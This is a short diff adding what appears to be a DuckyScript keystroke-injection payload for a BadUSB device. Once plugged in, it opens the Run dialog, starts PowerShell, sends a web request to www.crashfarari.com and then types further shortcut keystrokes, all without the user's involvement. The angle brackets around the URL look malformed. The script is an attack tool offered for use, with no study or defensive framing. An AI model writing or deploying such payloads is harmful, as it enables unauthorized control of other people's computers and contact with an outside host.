@@ -1,0 +1,15 @@
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 1400
+STRING Invoke-WebRequest -Uri < www.crashfarari.com > -Method GET;exit
+ENTER
+DELAY 500 
+ENTER 
+DELAY 500 
+GUI b
+DELAY 500 
+CTRL-ALT t
+DELAY 500 
+ENTER 
